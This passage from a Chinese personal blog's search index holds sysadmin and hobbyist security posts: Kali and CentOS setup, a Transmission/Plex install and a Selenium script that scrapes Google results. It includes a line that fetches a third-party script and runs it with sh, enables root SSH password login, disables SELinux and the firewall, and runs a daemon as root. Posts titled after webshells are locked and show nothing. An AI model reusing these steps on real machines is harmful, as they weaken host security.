    <url>%2F2019%2F12%2F01%2F108_%E6%A0%91%E8%8E%93%E6%B4%BE%E6%88%96debian%E7%9A%84vim%E5%8F%B3%E9%94%AE%E8%BF%9B%E5%85%A5visual%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[树莓派或debian的vim右键进入visual模式QQ群：397745473 修改方法： 123find / -name defaults.vim # 找不到文件用find查一下vim /usr/share/vim/vim80/defaults.vim 第70行 在mouse=a的=前面加个- 如下： 123if has(&apos;mouse&apos;) set mouse-=aendif 保存退出即可生效，耽误我1个小时才找到，配置文件建原来在这。 原文链接：https://blog.csdn.net/dsc1245/article/details/82695306 QQ群：397745473]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali常规操作]]></title>
    <url>%2F2019%2F12%2F01%2F111_kali%E5%B8%B8%E8%A7%84%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[kali常规操作 解决ssh无程连接问题 解决安装源问题 解决中文乱码问题 QQ群：397745473 kali常规操作 改 SSH123456789/etc/init.d/ssh restartupdate-rc.d ssh enable# vim /etc/ssh/sshd_config#PermitRootLogin prohibit-passwordPermitRootLogin yes#PasswordAuthentication yesPasswordAuthentication yes 安装完kali后改源 12345678910vim /etc/apt/sources.listdeb http://http.kali.org/kali kali-rolling main non-free contribdeb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib# apt-get update &amp;&amp; apt-get upgrade# apt-get dist-upgrade # apt-get clean Kali Rolling 解决中文乱码问题 123456789101112131415在命令行输入# dpkg-reconfigure locales进入图形化界面之后，（空格是选中/取消，Tab是切换），选中 en_US.UTF-8 和 zh_CN.UTF-8，确定回车后，将en_US.UTF-8选为默认。安装中文字体# apt-get install xfonts-intl-chinese# apt-get install ttf-wqy-microhei重启 reboot这时发现网页不乱码，系统也不乱码，但是是英文的界面。打开系统设置，找到设置语言的地方，将语言再改为汉语（中国）。如果没有，或者找不到的输入如下命令：# echo LANG="zh_CN.UTF-8" &gt; /etc/default/locale QQ群：397745473]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[小内存vps被killed怎么办]]></title>
    <url>%2F2019%2F12%2F01%2F113_%E5%B0%8F%E5%86%85%E5%AD%98vps%E8%A2%ABkilled%E6%80%8E%E4%B9%88%E5%8A%9E%2F</url>
    <content type="text"><![CDATA[在小内存vps执行一些比较耗内存的python程序时,过一会就会提示killed怎么办？ QQ群：397745473 只需要在python中加入如下代码就可以了: 12345import ospid = os.getpid()command = &apos;&apos;&apos;echo -1000 &gt;/proc/&#123;pid&#125;/oom_score_adj&apos;&apos;&apos;.format(pid=pid)os.system(command) QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用Transmission加Plex制作家庭影院]]></title>
    <url>%2F2019%2F12%2F01%2F114_%E7%94%A8Transmission%E5%8A%A0Plex%E5%88%B6%E4%BD%9C%E5%AE%B6%E5%BA%AD%E5%BD%B1%E9%99%A2%2F</url>
    <content type="text"><![CDATA[用Transmission+Plex制作家庭影院 QQ群：397745473 下载安装plex1https://www.plex.tv/media-server-downloads/ 安装下载工具Debian/Ubuntu系统安装: 1wget http://dadi.me/wp-content/uploads/dir/Transmission/debian-transmission.sh Centos: 1wget http://github.itzmx.com/1265578519/transmission/master/2.84/transmissionbt.sh -O transmissionbt.sh;sh transmissionbt.sh 12345678910111213141516171819202122232425262728293031323334353637383940# 1. 软件更新apt-get update &amp;&amp; apt-get upgrade# 2. 安装Transmission主程序apt-get install transmission -y# 3. 安装Transmission进程守护程序,并生成默认配置apt-get install transmission-daemon -y# 4. 暂停transmission-daemon进程/etc/init.d/transmission-daemon stop# 5. 修改settings.json配置文件vim /var/lib/transmission-daemon/info/settings.json# 6. 修改settings.json中三处位置：&quot;rpc-username&quot;后面修改用户名&quot;rpc-password&quot;后面修改默认密码&quot;rpc-port&quot;后面修改端口&quot;rpc-whitelist-enabled&quot;后面修改为&quot;false&quot;接下来按ESC,并输入:wq保存退出# 7. 修改用户权限vim /etc/init.d/transmission-daemon #将其中的USER=debian-transmission修改为USER=root，接下来按ESC,并输入:wq保存退出# 8. 启动Transmission程序/etc/init.d/transmission-daemon start# 1. 安装curlapt-get install curl# 2. 下载美化版执行脚本wget -N https://github.com/ronggang/transmission-web-control/raw/master/release/install-tr-control-cn.sh --no-check-certificate# 3. 执行脚本，本处直接填写了transmission web文件夹所在地bash install-tr-control-cn.sh /usr/share/transmission/web/usr/bin/whoami# 4. 在几个选项里选择1 相关参考: https://zvv.me/z/1043.htmlhttps://www.plex.tv/media-server-downloads/ QQ群：397745473]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一句话木马分析]]></title>
    <url>%2F2019%2F11%2F26%2F102_%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cookie一句话木马生成器]]></title>
    <url>%2F2019%2F11%2F26%2F103_cookie%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%94%9F%E6%88%90%E5%99%A8%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用scrapy收集url]]></title>
    <url>%2F2019%2F11%2F07%2F101_%E7%94%A8scrapy%E6%94%B6%E9%9B%86url%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu升级java版本]]></title>
    <url>%2F2019%2F10%2F28%2F99_ubuntu%E5%8D%87%E7%BA%A7java%E7%89%88%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[java 升级java版本命令如下： QQ群：397745473 当前版本信息123456789查java位置root@v:~# whereis javajava: /usr/bin/java /usr/lib/java /usr/share/java /usr/share/man/man1/java.1.gz查版本root@v:~# /usr/bin/java -versionopenjdk version &quot;1.8.0_222&quot;OpenJDK Runtime Environment (build 1.8.0_222-8u222-b10-1ubuntu1~18.04.1-b10)OpenJDK 64-Bit Server VM (build 25.222-b10, mixed mode) 获取最新版本上传到服务器12下载地址:https://www.oracle.com/technetwork/java/javase/downloads/jdk11-downloads-5066655.html 解压并重新替换软链接1234567mkdir -p /opt/jdktar -zxf jdk-11.0.5_linux-x64_bin.tar.gz -C /opt/jdk/rm -f /usr/bin/java /usr/bin/javacln -s /opt/jdk/jdk-11.0.5/bin/java /usr/bin/javaln -s /opt/jdk/jdk-11.0.5/bin/javac /usr/bin/javac 确认升级成功1234567root@v:~# java -versionjava version "11.0.5" 2019-10-15 LTSJava(TM) SE Runtime Environment 18.9 (build 11.0.5+10-LTS)Java HotSpot(TM) 64-Bit Server VM 18.9 (build 11.0.5+10-LTS, mixed mode)root@v:~# javac -versionjavac 11.0.5 参考: https://blog.csdn.net/keainanhaio/article/details/78659480 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[“谷歌结果url采集”]]></title>
    <url>%2F2019%2F10%2F23%2F98_%E8%B0%B7%E6%AD%8C%E7%BB%93%E6%9E%9Curl%E9%87%87%E9%9B%86%2F</url>
    <content type="text"><![CDATA[谷歌结果url采集 别想了，采不了，谷歌的人机验证码连人都过不了。就别想着用脚本来做了。 手工做倒是有一个比较方便的办法，代码如下： QQ群：397745473 1.设定–&gt;搜寻设定–&gt;每頁搜尋結果數量–拉到100 2.打开 Console 3.搜内容 4.在 Console 中输入以下代码 1234567891011121314var tag=document.getElementsByClassName('r'); for (var i=0;i&lt;tag.length;i++)&#123; var a=tag[i].getElementsByTagName("a"); try&#123; console.log(a[0].href) &#125;catch(err)&#123;&#125;&#125;翻页代码:var nextPageA=document.getElementById("pnnext");if(nextPageA!=null)&#123; location.href=nextPageA.href;&#125; 小技巧：按下一页列表就会清空,可以再按一下向上的键就能把刚才的输入调出来了 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[复活被墙ip]]></title>
    <url>%2F2019%2F10%2F14%2F97_%E5%A4%8D%E6%B4%BB%E8%A2%AB%E5%A2%99ip%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! 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]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[U盘变光驱安装ESXI]]></title>
    <url>%2F2019%2F10%2F10%2F95_U%E7%9B%98%E5%8F%98%E5%85%89%E9%A9%B1%2F</url>
    <content type="text"><![CDATA[U盘变光驱安装ESXI QQ群：397745473 PE 下载和esxi文件老毛桃PE: https://www.laomaotao.net/ 制作U盘 后 在U盘的根目录建立一个文件夹，名字改成：“MYEXT” https://my.vmware.com/cn/web/vmware/downloads 点击–VMware vSphere–下载产品–essentials–VMware vSphere Hypervisor (ESXi) 6.7 U3–转至下载–下载试用 下载完ISO文件放到MYEXT中 安装教程：https://www.ixigua.com/i6677112636397584904/ https://www.vediotalk.com/archives/2356 解决网卡不支持的情况参考:https://www.cnblogs.com/dybk/p/8408630.html 如果win10打不了驱动可以试试用 xp系统 QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>esxi</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[centos自动谷歌搜关键词并收集URL]]></title>
    <url>%2F2019%2F10%2F03%2F100_centos%E8%87%AA%E5%8A%A8%E8%B0%B7%E6%AD%8C%E6%90%9C%E5%85%B3%E9%94%AE%E8%AF%8D%E5%B9%B6%E6%94%B6%E9%9B%86URL%2F</url>
    <content type="text"><![CDATA[centos自动谷歌搜关键词并收集URL QQ群：397745473 环境准备需要安装centos 桌面环境,只需要在装系统的时候选上desktop就行了。 centos 7 安装RDP参考:https://www.cnblogs.com/lenmom/p/9516210.html 12345678910111213141516171819202122232425262728yum install -y epel-release xrdp tigervnc-server tmuxvncpasswd rootyum -y update &amp;&amp; yum -y upgradesed -i &apos;s/max_bpp=32/max_bpp=24/g&apos; /etc/xrdp/xrdp.ini修改XRDP最大连接数，否则远程连接可能无法成功,把max_bpp=32, 改为max_bpp=24sed -i &apos;s/SELINUX=enforcing/SELINUX=disabled/g&apos; /etc/selinux/configsystemctl stop firewalldsystemctl disable firewalld或 firewall-cmd --permanent --zone=public --add-port=3389/tcpfirewall-cmd --reloadsystemctl start xrdpsystemctl enable xrdpsystemctl enable sshdyum -y install tmuxtmux new -s vsyourtmux lstmux a -d -t vsyour左右分屏：prefix + %上下分屏：prefix + &apos; 安装软件: 12345678910111213141516171819anaconda参考:https://www.anaconda.com/wget https://repo.anaconda.com/archive/Anaconda3-2019.10-Linux-x86_64.shpycharm 参考:https://www.cnblogs.com/niuli1987/p/9917650.htmlwget https://download.jetbrains.com/python/pycharm-professional-2018.1.tar.gzln -s /root/pycharm-2018.1/bin/pycharm.sh /root/桌面/pycharm用xfce4 桌面环境yum install epel-releaseyum groupinstall xfce4执行 yum groupinstall xfce4安装Xfce4桌面环境。如果需要，可选安装xfce4的其他模块。执行sudo systemctl isolate graphical.target,进入Xfceyum groupinstall "X Window system" 解决问题Centos xrdp 远程连接后突然闪退由于anconda 与xrdp冲突所以重启后连接xrdp远程桌面时会出现闪退的现象，所以需要启动的时候把原来的anconda的注释掉,改成下面这样就可以了 供参考：vim ~/.bashrc 1234567891011121314151617181920212223242526272829# .bashrc# User specific aliases and functionsalias rm='rm -i'alias cp='cp -i'alias mv='mv -i'# Source global definitionsif [ -f /etc/bashrc ]; then . /etc/bashrcfi. "/root/.acme.sh/acme.sh.env"# &gt;&gt;&gt; conda initialize &gt;&gt;&gt;# !! Contents within this block are managed by 'conda init' !!export PATH="$PATH:/root/anaconda3/bin"#__conda_setup="$('/root/anaconda3/bin/conda' 'shell.bash' 'hook' 2&gt; /dev/null)"#if [ $? -eq 0 ]; then# eval "$__conda_setup"#else# if [ -f "/root/anaconda3/etc/profile.d/conda.sh" ]; then# . "/root/anaconda3/etc/profile.d/conda.sh"# else# #export PATH="/root/anaconda3/bin:$PATH"# export PATH="$PATH:/root/anaconda3/bin"# fi#fi 参考：https://www.cnblogs.com/infoo/p/11239490.htmlhttp://blog.sina.com.cn/s/blog_71bd750b010312q3.html 另一种无法进入桌面的情况都没干啥 就又进不了桌面了…. 于是又是一顿操作 123456参考:https://bugzilla.redhat.com/show_bug.cgi?id=1529419abrt-auto-reporting enabled1.Fresh install RHEL7.7alpha via mimi mode;2.Install GUI via the command " yum groupinstall "Server with GUI" ",boot into GUI,it is not reproduce;3.Update libX11(libX11-1.6.7-2.el7.x86_64) ,reboot and check the messages log,it still not reproduce.重启后就恢复正常了 安装浏览器驱动1234wget https://github.com/mozilla/geckodriver/releases/download/v0.23.0/geckodriver-v0.23.0-linux64.tar.gztar -xvzf geckodriver-v0.23.0-linux64.tar.gzchmod +x geckodrivermv geckodriver /usr/local/bin/ 安装输入法​ 注意 装完后进不了桌面了，查了很久原因，原来是这个引起的。。。这一步最好就不操作了！！！ 参考: https://jingyan.baidu.com/article/cbf0e500b791142eaa28932f.html 1234yum remove ibusyum install ibus ibus-tableyum install ibus ibus-table-wubi这个操作完有问题，直接进不了桌面了 自动搜索代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115# coding:utf-8# pip install selenium -i http://pypi.douban.com/simple/ --trusted-host pypi.douban.comfrom bs4 import BeautifulSoupfrom selenium import webdriverimport datetimeimport requestsimport jsonimport osimport timeimport randomfrom selenium.webdriver.common.keys import Keys # 引入模块from selenium.webdriver.common.action_chains import ActionChainsclass GetGoogleUrl(object): def __init__(self): self.printInfo('开始获取关键词....') self.keys=[] for i in range(0,31): pastTime = (datetime.datetime.now() - datetime.timedelta(days=i)).strftime('%Y%m%d') url = f'https://trends.google.com/trends/api/dailytrends?hl=en-US&amp;tz=0&amp;ed=&#123;pastTime&#125;&amp;geo=US&amp;ns=15' try: response = requests.get(url) response.encoding = 'utf-8' jdata = json.loads(response.text.strip().replace(')]&#125;\',\n', '')) for x in jdata['default']['trendingSearchesDays'][0]['trendingSearches']: self.keys.append(x['title']['query']) except Exception as e: self.printInfo(f'获取关键词&#123;url&#125;出错,提示信息:&#123;e&#125;') self.printInfo(f'使用URL &#123;url&#125; 当前词量 &#123;len(self.keys)&#125;个') self.keys=set(self.keys) self.printInfo(f'去重后还有&#123;len(self.keys)&#125;个') firefox_options = webdriver.FirefoxOptions() firefox_options.add_argument("--disable-infobars") # 设置禁用浏览器正在被自动化程序控制的提示 #firefox_options.add_argument('--headless') # 以所谓的headless模式打开chrome firefox_options.add_argument("--incognito") # 设置无痕模式 self.Firefox_driver = webdriver.Firefox(options=firefox_options) def printInfo(self,string): nowTime = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') # 现在 printContent=f'[*] &#123;nowTime&#125; &#123;string&#125;' print(printContent) def getUrl(self): try: soup=BeautifulSoup(self.Firefox_driver.page_source,'lxml') if soup: for i in soup.find_all('div',attrs=&#123;'class':'r'&#125;): try: writeUrl=i.a.get('href') except Exception as e: self.printInfo(f'&#123;i&#125; 获取url 失败,提示: &#123;e&#125;') continue if writeUrl: with open('urls.txt','a') as f: f.write(i.a.get('href')+'\n') if soup.find('a',attrs=&#123;'id':'pnnext'&#125;): return True else: return False except Exception as e: self.printInfo(f'&#123;self.Firefox_driver.current_url&#125; 获取网站源码失败,提示: &#123;e&#125;') return True def seachKey(self,key): self.printInfo(f'正在搜索: &#123;key&#125;') down = "var q=document.documentElement.scrollTop=100000" try: self.Firefox_driver.find_element_by_name("q").clear() self.Firefox_driver.find_element_by_name("q").send_keys(key, Keys.RETURN) time.sleep(random.randint(1, 60)) pageNumber=0 while True: pageNumber+=1 # 获取内容 if not self.getUrl(): time.sleep(random.randint(1, 60)) self.printInfo(f'抓取&#123;pageNumber&#125;页完成!') break time.sleep(random.randint(1, 10)) self.Firefox_driver.execute_script(down) # 下拉 #self.Firefox_driver.execute_script('window.scrollTo(0,1000000)') #self.Firefox_driver.execute_script(pnnext) # 翻页 ActionChains(self.Firefox_driver).move_to_element(self.Firefox_driver.find_element_by_id("pnnext")).perform() # 模拟鼠标移动 time.sleep(random.randint(1, 3)) self.Firefox_driver.find_element_by_id("pnnext").click() # 点击翻页 time.sleep(random.randint(1, 10)) except Exception as e: self.printInfo(f'搜索失败,提示: &#123;e&#125;') tipMessage=''' Message: Unable to clear element that cannot be edited: &lt;input name="q" type="hidden"&gt; ''' if tipMessage in e: return 'exit' def firefoxDriver(self, url): time.sleep(random.randint(1,3)) # sleep一下，否则有可能报错 self.Firefox_driver.implicitly_wait(1) self.Firefox_driver.get(url) keyNumber=0 for key in self.keys: keyNumber+=1 self.printInfo(f'[&#123;str(keyNumber).zfill(3)&#125;]'.center(100,'+')) if self.seachKey(key) == 'exit': return 'exit'if __name__ == '__main__': for _ in range(2): getGoogleUrl = GetGoogleUrl() if getGoogleUrl.firefoxDriver('https://www.google.com/ncr') == 'exit': getGoogleUrl.Firefox_driver.quit() 去重代码123456789101112131415161718192021#coding:utf-8import globdef fun_set(l): return list(set(l))allDomain=[]for fileName in glob.glob('urls*.txt'): with open(fileName,'r') as f: allUrl=f.read().split('\n') print(f'&#123;fileName&#125; 取到条 &#123;len(allUrl)&#125; URL.') allDomain+=allUrlallDomain_1=[]for i in fun_set(allDomain): data='/'.join(i.split('/')[2:3]) if data: allDomain_1.append(data)n=0for i in fun_set(allDomain_1): n+=1 print(n,i) 新发现在windows 上安装过 TunSafe 或者 WireGuard 的客户端后,就能直接用cmd中打开ssh连接远程的linux电脑了。 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux中scp非22端口复制远程文件]]></title>
    <url>%2F2019%2F10%2F02%2F96_scp%E9%9D%9E22%E7%AB%AF%E5%8F%A3%E5%A4%8D%E5%88%B6%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%2F</url>
